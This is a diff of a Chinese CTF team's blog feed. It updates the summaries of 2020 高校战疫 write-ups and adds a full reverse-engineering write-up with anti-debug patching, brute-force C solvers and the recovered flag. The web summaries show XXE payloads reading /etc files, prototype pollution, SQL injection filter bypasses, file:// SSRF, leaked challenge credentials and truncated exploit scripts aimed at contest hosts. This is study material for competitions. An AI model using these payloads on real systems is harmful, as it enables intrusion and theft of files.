@@ -27,8 +27,11 @@
     
     <summary type="html">
     
-      &lt;p&gt;根据gmon.out，可以注意到0x401XXX的地址，猜测vmp没有开虚拟化 &lt;/p&gt;
-&lt;p&gt;分析可知让其中的strcmp全部返回0即可强制输出flag &lt;/p&gt;
+      根据gmon.out，可以注意到0x401XXX的地址，猜测vmp没有开虚拟化 
+
+分析可知让其中的strcmp全部返回0即可强制输出flag 
+
+x64dbg挂上后单步时⼿动置零即可得到flag
     
     </summary>
     
@@ -47,8 +50,31 @@
     
     <summary type="html">
     
-      &lt;p&gt;Title: 2020 高校“战疫”网络安全分享赛 隐藏的信息&lt;/p&gt;
-&lt;p&gt;Date: 2020.3.17&lt;/p&gt;
+      Title: 2020 高校“战疫”网络安全分享赛 隐藏的信息
+
+Date: 2020.3.17
+
+Tags:
+
+-音频隐写
+
+Categories: misc
+
+二维码补全
+
+
+
+不是flag
+
+
+
+zip伪加密，解得⼀个wav
+
+audacity打开频谱图，分析前后两段DTMF码：
+
+
+
+得：187485618512，最后base64编码提交
     
     </summary>
     
@@ -67,8 +93,19 @@
     
     <summary type="html">
     
-      &lt;hr&gt;
-&lt;p&gt;title: 2020 高校战“疫”CTF easyparse&lt;br&gt;date: 2020.03.20&lt;br&gt;tags:&lt;/p&gt;
+      title: 2020 高校战“疫”CTF easyparse
+date: 2020.03.20
+tags:
+
+ * VM
+ * rust编译
+   tags:
+   题目在比赛的时候没做出来，赛后复盘发现硬件断点下错了，梳理逻辑后发现很简单。
+
+第一层考点：下准断点
+这是一个rust编译的程序，因此可读性较差，先找到输出对输出函数下断点
+_$LT$std..io..stdio..Stdin$u20$as$u20$std..io..Read$GT$::read::h174af29f99bd8aef
+每次执行这个函数都是从缓冲区读入一个字节，当所有字节都读完之后再一个一个字节验证，很容易联想到p
     
     </summary>
     
@@ -87,28 +124,18 @@
     
     <summary type="html">
     
-      &lt;hr&gt;
-&lt;p&gt;title: 2020 高校战“疫”CTF !ftcx&lt;br&gt;date: 2020.03.20&lt;br&gt;tags:&lt;/p&gt;
-    
-    </summary>
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title>2020_GXZCTF_天津垓</title>
-    <link href="https://boiteam.github.io/2020/03/21/2020_GXZCTF_%E5%A4%A9%E6%B4%A5%E5%9E%93/"/>
-    <id>https://boiteam.github.io/2020/03/21/2020_GXZCTF_%E5%A4%A9%E6%B4%A5%E5%9E%93/</id>
-    <published>2020-03-21T08:56:00.366Z</published>
-    <updated>2020-03-20T10:00:39.927Z</updated>
-    
-    <content type="html"><![CDATA[<hr><p>title: 2020 高校战“疫”CTF 天津垓<br>date: 2020.03.20<br>tags:</p><ul><li>反调试</li><li>算法求解</li><li>smc<br>top:</li><li>有两层加密，第一次的正确作为smc解密的密钥</li></ul><p><strong>第一层考点：去反调试</strong><br>64位的程序发现有反调试<br>_BOOL8 sub_10040162B()<br>{<br>  _BOOL8 result; // rax</p><p>  result = sub_100401195();<br>  if ( (_DWORD)result )<br>    exit(1);<br>  return result;<br>}<br>发现有反调试直接nop掉<br><strong>第二层考点：算法求解</strong><br>找到关键算法后直接爆破<br>#include&lt;stdio.h&gt;<br>int main()<br>{<br>    char key[] = “Rising_Hopper!”;<br>    int result[] = { 17,8,6,10,15,20,42,59,47,3,47,4,16,72,62,0,7,16 };<br>    char flag;<br>    for (int i = 0; i &lt;= 17;i++)<br>    {<br>        for (flag = 0x20; flag &lt;= 0x7e; flag++)<br>        {<br>            if ((~(flag &amp; key[i % 14]) &amp; (flag | key[i % 14])) == result[i])<br>            {<br>                printf(“%c”,flag);<br>            }<br>        }<br>    }</p><p>}<br>Caucasus@s_ability<br><strong>第三层考点：smc</strong><br>  lpAddress = a1;<br>  v7 = a2;<br>  v8 = a3;<br>  if ( strlen(Str) != 18 )<br>    exit(1);<br>  if ( !VirtualProtect(lpAddress, v7, 0x40u, &amp;flOldProtect) )<br>    exit(1);<br>  for ( i = 0; i &lt; v7; ++i )<br>    *((_BYTE *)lpAddress + i) ^= *(_BYTE *)(i % 18 + v8);<br>  result = VirtualProtect(lpAddress, v7, flOldProtect, &amp;flOldProtect);<br>  if ( !result )<br>    exit(1);<br>  return result;<br>这是利用第一层密文对代码进行加密，执行完后dump出内存，重新利用IDAf5便可找到关键算法<br>#include&lt;stdio.h&gt;<br>int main()<br>{<br>    int result[]={0x1EA272,0x206FC4,0x1D2203,0x1EEF55,0x24F111,0x193A7C,0x1F3C38,0x21566D,0x2323BF,0x2289F9,0x1D2203,0x21098A,0x1E08AC,0x223D16,0x1F891B,0x2370A2,0x1E558F,0x223D16,0x1C883D,0x1F891B,0x2289F9,0x1C883D,0xEB773,0xE6A90,0xE6A90,0xE6A90,0xB1CCF,0x1C883D,0x2289F9,0x22D6DC,0x223D16,0x21566D,0x21098A,0x1EEF55,0x1E558F,0x223D16,0x1C883D,0x22D6DC,0x1F3C38,0x1D2203,0x21098A,0x1C883D,0x24A42E,0x1E558F,0x223D16,0x21566D,0xD83E7,0x21566D,0x21098A,0x1E558F,0x258AD7};<br>    for (int i = 0; i &lt;= 51;i++)<br>    {<br>        for (int j = 0x20; j &lt;= 0x7e; j++)<br>        {<br>            if (0x4ce3 *j % (unsigned int)0x8000000B == result[i])<br>            {<br>                printf(“%c”,j);<br>            }<br>        }<br>    }<br>}<br>flag{Thousandriver_is_1000%_stronger_than_zero-one}</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;hr&gt;
-&lt;p&gt;title: 2020 高校战“疫”CTF 天津垓&lt;br&gt;date: 2020.03.20&lt;br&gt;tags:&lt;/p&gt;
+      title: 2020 高校战“疫”CTF !ftcx
+date: 2020.03.20
+tags:
+
+ * 算法求解
+   top:
+ * 密文生成和加密运算是两个不同
+   密文是通过一系列加密运算直接生成的，dump出来就能用
+
+第一层考点：魔改base58
+里面稍微加了点混淆，且表也改了，因此不太容易看出这是base58的算法，但有一个显著的特征，他总是在在进行%58操作，因此通过这一特征也可以联想到base58
+附魔改base58脚本
     
     </summary>
     
@@ -154,6 +181,50 @@ v1 += 3;
   </entry>
   
   <entry>
+    <title>2020 高校战“疫”CTF 天津垓</title>
+    <link href="https://boiteam.github.io/2020/03/20/2020_GXZCTF_%E5%A4%A9%E6%B4%A5%E5%9E%93/"/>
+    <id>https://boiteam.github.io/2020/03/20/2020_GXZCTF_%E5%A4%A9%E6%B4%A5%E5%9E%93/</id>
+    <published>2020-03-19T16:00:00.000Z</published>
+    <updated>2020-03-21T09:11:29.421Z</updated>
+    
+    <content type="html"><![CDATA[<p>有两层加密，第一次的正确作为smc解密的密钥<br><strong>第一层考点：去反调试</strong><br>64位的程序发现有反调试<br>_BOOL8 sub_10040162B()<br>{<br>  _BOOL8 result; // rax</p><p>  result = sub_100401195();<br>  if ( (_DWORD)result )<br>    exit(1);<br>  return result;<br>}<br>发现有反调试直接nop掉<br><strong>第二层考点：算法求解</strong><br>找到关键算法后直接爆破<br>#include&lt;stdio.h&gt;<br>int main()<br>{<br>    char key[] = “Rising_Hopper!”;<br>    int result[] = { 17,8,6,10,15,20,42,59,47,3,47,4,16,72,62,0,7,16 };<br>    char flag;<br>    for (int i = 0; i &lt;= 17;i++)<br>    {<br>        for (flag = 0x20; flag &lt;= 0x7e; flag++)<br>        {<br>            if ((~(flag &amp; key[i % 14]) &amp; (flag | key[i % 14])) == result[i])<br>            {<br>                printf(“%c”,flag);<br>            }<br>        }<br>    }</p><p>}<br>Caucasus@s_ability<br><strong>第三层考点：smc</strong><br>  lpAddress = a1;<br>  v7 = a2;<br>  v8 = a3;<br>  if ( strlen(Str) != 18 )<br>    exit(1);<br>  if ( !VirtualProtect(lpAddress, v7, 0x40u, &amp;flOldProtect) )<br>    exit(1);<br>  for ( i = 0; i &lt; v7; ++i )<br>    *((_BYTE *)lpAddress + i) ^= *(_BYTE *)(i % 18 + v8);<br>  result = VirtualProtect(lpAddress, v7, flOldProtect, &amp;flOldProtect);<br>  if ( !result )<br>    exit(1);<br>  return result;<br>这是利用第一层密文对代码进行加密，执行完后dump出内存，重新利用IDAf5便可找到关键算法<br>#include&lt;stdio.h&gt;<br>int main()<br>{<br>    int result[]={0x1EA272,0x206FC4,0x1D2203,0x1EEF55,0x24F111,0x193A7C,0x1F3C38,0x21566D,0x2323BF,0x2289F9,0x1D2203,0x21098A,0x1E08AC,0x223D16,0x1F891B,0x2370A2,0x1E558F,0x223D16,0x1C883D,0x1F891B,0x2289F9,0x1C883D,0xEB773,0xE6A90,0xE6A90,0xE6A90,0xB1CCF,0x1C883D,0x2289F9,0x22D6DC,0x223D16,0x21566D,0x21098A,0x1EEF55,0x1E558F,0x223D16,0x1C883D,0x22D6DC,0x1F3C38,0x1D2203,0x21098A,0x1C883D,0x24A42E,0x1E558F,0x223D16,0x21566D,0xD83E7,0x21566D,0x21098A,0x1E558F,0x258AD7};<br>    for (int i = 0; i &lt;= 51;i++)<br>    {<br>        for (int j = 0x20; j &lt;= 0x7e; j++)<br>        {<br>            if (0x4ce3 *j % (unsigned int)0x8000000B == result[i])<br>            {<br>                printf(“%c”,j);<br>            }<br>        }<br>    }<br>}<br>flag{Thousandriver_is_1000%_stronger_than_zero-one}</p>]]></content>
+    
+    <summary type="html">
+    
+      有两层加密，第一次的正确作为smc解密的密钥
+第一层考点：去反调试
+64位的程序发现有反调试
+_BOOL8 sub_10040162B()
+{
+_BOOL8 result; // rax
+
+ result = sub_100401195();
+if ( (_DWORD)result )
+exit(1);
+return result;
+}
+发现有反调试直接nop掉
+第二层考点：算法求解
+找到关键算法后直接爆破
+#include&lt;stdio.h&gt;
+int main()
+{
+char key[] = “Rising_Hopper!”;
+int result[] = { 17,8,6,10,15,20
+    
+    </summary>
+    
+    
+    
+      <category term="反调试" scheme="https://boiteam.github.io/tags/%E5%8F%8D%E8%B0%83%E8%AF%95/"/>
+    
+      <category term="算法求解" scheme="https://boiteam.github.io/tags/%E7%AE%97%E6%B3%95%E6%B1%82%E8%A7%A3/"/>
+    
+      <category term="smc" scheme="https://boiteam.github.io/tags/smc/"/>
+    
+  </entry>
+  
+  <entry>
     <title>2020 GXZYCTF happyvacation</title>
     <link href="https://boiteam.github.io/2020/03/09/2020_GXZCTF_happyvacation/"/>
     <id>https://boiteam.github.io/2020/03/09/2020_GXZCTF_happyvacation/</id>
@@ -164,7 +235,69 @@ v1 += 3;
     
     <summary type="html">
     
-      &lt;h1 id=&quot;one&quot;&gt;&lt;a href=&quot;#one&quot; class=&quot;headerlink&quot; title=&quot;one&quot;&gt;&lt;/a&gt;one&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;/2020/03/09/2020_GXZCTF_happyvacation/1584757078800.png&quot; alt=&quot;1584757078800&quot;&gt;&lt;/p&gt;
+      one
+
+
+得到源码，突破点为：
+
+
+
+clone的复制是浅复制
+
+
+
+也就是我们可以覆盖这个类中的一些元素, 那么看一下这个$user怎么传
+
+
+
+ 我们既然可以覆盖元素, 那么比如
+
+
+
+EXP
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+
+
+import requests
+import re
+
+url = &quot;http://192.168.2.106:4000/&quot;
+sess = requests.Session()
+
+def login():
+    sess
     
     </summary>
     
@@ -191,8 +324,49 @@ v1 += 3;
     
     <summary type="html">
     
-      &lt;p&gt;看到log函数里面有merge，那么可以原型链污染了&lt;/p&gt;
-&lt;figure class=&quot;highlight pf&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;function &lt;span class=&quot;keyword&quot;&gt;log&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;user&lt;/span&gt;Info)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    let &lt;span class=&quot;keyword&quot;&gt;log&lt;/span&gt;Item = &amp;#123;&lt;span class=&quot;string&quot;&gt;&quot;time&quot;&lt;/span&gt;:new Date().&lt;span class=&quot;keyword&quot;&gt;to&lt;/span&gt;String()&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    merge(&lt;span class=&quot;keyword&quot;&gt;log&lt;/span&gt;Item,&lt;span class=&quot;keyword&quot;&gt;user&lt;/span&gt;Info);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    loginHistory.push(&lt;span class=&quot;keyword&quot;&gt;log&lt;/span&gt;Item);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+      看到log函数里面有merge，那么可以原型链污染了
+
+1
+2
+3
+4
+5
+6
+
+
+
+function log(userInfo){
+    let logItem = {&quot;time&quot;:new Date().toString()};
+    merge(logItem,userInfo);
+    loginHistory.push(logItem);
+}
+
+
+然后post/路由中调用了log
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+
+
+
+//So terrible code~
+app.post(&#39;/&#39;,function (req, res) {
+
     
     </summary>
     
@@ -221,8 +395,33 @@ v1 += 3;
     
     <summary type="html">
     
-      &lt;p&gt;&lt;img src=&quot;/2020/03/09/2020_GXZYCTF_baby_java/image-20200311132610679.png&quot; alt&gt;&lt;/p&gt;
-&lt;p&gt;很酷炫，然后比赛就是不会做，burp截包可以看到这里用了xml格式来读取输入的数据，可以xxe，&lt;/p&gt;
+      很酷炫，然后比赛就是不会做，burp截包可以看到这里用了xml格式来读取输入的数据，可以xxe，
+
+1
+2
+3
+4
+
+
+
+&lt;!DOCTYPE any [
+&lt;!ENTITY  xxe  &quot;bbbbb&quot;&gt;]&gt;
+&lt;user&gt;&lt;number&gt;fffff&lt;/number&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/user&gt;
+
+
+
+
+可以解析xml，比赛时测试带上&amp;，%就会get out hacker ，以为把&amp;和%都禁了，然后就没有然后了，还是对xxe的理解不够深入，然后继续测试，
+
+1
+2
+3
+4
+
+
+
+DOCTYPE any [
+&lt;!ENTITY  xxe SYSTEM  &quot;file:///etc
     
     </summary>
     
@@ -249,8 +448,39 @@ v1 += 3;
     
     <summary type="html">
     
-      &lt;p&gt;首先进入页面提示&lt;/p&gt;
-&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;?time=Y 或者 Y=&lt;span class=&quot;number&quot;&gt;2020&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+      首先进入页面提示
+
+1
+
+
+?time=Y 或者 Y=2020
+
+
+然后经过测试，发现这是经过date函数处理的，而绕过这个函数，只需要在每个字符前面添加反斜杠
+
+
+
+然后就是正常的SQL注入，基本没有过滤任何函数
+
+得到数据库的内容为
+
+1
+
+
+url： /eGlhb2xldW5n username： admin password： 20200202goodluck
+
+
+访问 /eGlhb2xldW5n，登录后台后存在文件读取
+
+1
+
+
+url=file://localhost/var/www/html/index.php
+
+
+这儿使用file://localhost绕过本地
+
+然后读取得到
     
     </summary>
     
@@ -277,8 +507,35 @@ v1 += 3;
     
     <summary type="html">
     
-      &lt;p&gt;考点一、源码泄露&lt;/p&gt;
-&lt;p&gt;扫到源码&lt;/p&gt;
+      考点一、源码泄露
+
+扫到源码
+
+
+
+考点二、session反序列化
+
+在login.php内包含了init.php，其中设置了序列化处理器，并且session是以文件形式保留的
+
+1
+2
+3
+
+
+session_save_path(&#39;session&#39;);
+ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;);
+session_start()
+
+
+而profile.php和core/init.php中使用了另外的序列化处理器：
+
+1
+2
+3
+
+
+session_save_path(&#39;../session&#39;);
+ini_set(&#39;session.
     
     </summary>
     
@@ -307,8 +564,54 @@ v1 += 3;
     
     <summary type="html">
     
-      &lt;p&gt;根据登入后的提示，用户会有分级，注册账号的时候隐藏了type属性&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;/2020/03/09/2020_GXZYCTF_nweb/0-1583722768764.png&quot; alt&gt;            &lt;/p&gt;
+      根据登入后的提示，用户会有分级，注册账号的时候隐藏了type属性
+
+ 
+
+type赋值为110，登录后可以访问flag.php 里面是一个search框，可以测试一下注入
+
+ 
+
+ 
+
+简单测试发现只过滤了select和from，可以双写绕过，所以写一个脚本跑就行了
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+
+
+# encoding=utf-8
+import requests
+flag= &#39;&#39;
+url = &#39;http://121.37.179.47:1001/search.
     
     </summary>
     
@@ -337,8 +640,15 @@ v1 += 3;
     
     <summary type="html">
     
-      &lt;p&gt;&lt;img src=&quot;/2020/03/09/2020_GXZYCTF_sqlchekin/1584754809272.png&quot; alt=&quot;1584754809272&quot;&gt;&lt;/p&gt;
-&lt;p&gt;进去可以看到这个页面, 源码如下&lt;/p&gt;
+      进去可以看到这个页面, 源码如下
+
+
+
+有原题
+
+https://gksec.com/HNCTF2019-Final.html
+
+所以根据一番资料查找，发现&#39;-0-&#39;可以代替&#39;or&#39;1绕过。
     
     </summary>
     
@@ -365,8 +675,110 @@ v1 += 3;
     
     <summary type="html">
     
-      &lt;p&gt;部分源码&lt;/p&gt;
-&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;98&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;error_reporting(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Db&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;class&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; $ip;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; $user;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; $password;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; $option;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;__construct&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;($ip,$user,$password,$option)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;user=$user;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;ip=$ip;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;password=$password;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;option=$option;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;testquery&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        $m = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; mysqli(&lt;span 